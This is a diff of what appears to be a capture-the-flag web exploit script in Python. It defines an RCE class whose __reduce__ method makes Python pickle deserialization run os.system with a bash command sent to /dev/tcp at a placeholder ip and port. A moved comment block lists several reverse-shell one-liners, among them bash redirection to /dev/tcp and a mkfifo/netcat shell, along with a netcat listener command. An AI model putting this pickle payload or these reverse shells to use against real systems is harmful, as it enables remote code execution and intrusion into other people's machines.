@@ -23,37 +23,29 @@ def normal_post_request(debug=True):
 
     return
 
-
+######################
+   
+    # nc -lvnp 5555
+    # py .\web\fukuwarai\port_listener.py
+    # netstat -ano
+    #cmd =   "/bin/bash -c \"/bin/bash echo test > /dev/tcp/%s/%s\""%(ip,port)
+    #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
+    #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
+    #cmd =   "bash -c \"bash &>/dev/tcp/%s/%s<&1\""%(ip,port)
+    #cmd=    "bash &>/dev/tcp/%s/%s <&1"%(ip,port)
+    #cmd=    "bash -c \"bash &>/dev/tcp/%s/%s <&1\""%(ip,port)
+    #cmd ="bash -c \"bash &>/dev/tcp/%s/%s<&1\""%(ip,port)
+    #cmd ="mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %s >/tmp/f"%(ip,port)
+    #bash -c "bash &>/dev/tcp/%s/%s <&1"%(ip,port)
+    #bash &>/dev/tcp/%s/%s <&1%(ip,port)
+     #cmd=     "bash -c \"echo \"test\">/dev/tcp/%s/%s\""%(ip,port)
+    #bash -c "echo \"test\">/dev/tcp/%s/%s"%(ip,port)
+ #######################
 class RCE:
     def __reduce__(self):
         ip="??"
         port="??"
-        ######################
-        
-        # nc -lvnp 5555
-        # py .\web\fukuwarai\port_listener.py
-        # netstat -ano
-        #cmd =   "/bin/bash -c \"/bin/bash echo test > /dev/tcp/%s/%s\""%(ip,port)
-
-        #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
-        #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
-        #cmd =   "bash -c \"bash &>/dev/tcp/%s/%s<&1\""%(ip,port)
-        #cmd=    "bash &>/dev/tcp/%s/%s <&1"%(ip,port)
-        #cmd=    "bash -c \"bash &>/dev/tcp/%s/%s <&1\""%(ip,port)
-
-
-
-        #cmd ="bash -c \"bash &>/dev/tcp/%s/%s<&1\""%(ip,port)
         cmd ="bash -c \"echo \"test\" &>/dev/tcp/%s/%s\""%(ip,port)
-
-
-
-        #cmd ="mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %s >/tmp/f"%(ip,port)
-        #bash -c "bash &>/dev/tcp/%s/%s <&1"%(ip,port)
-        #bash &>/dev/tcp/%s/%s <&1%(ip,port)
-        #cmd=     "bash -c \"echo \"test\">/dev/tcp/%s/%s\""%(ip,port)
-        #bash -c "echo \"test\">/dev/tcp/%s/%s"%(ip,port)
-        #######################
         return os.system, (cmd,)
         
 
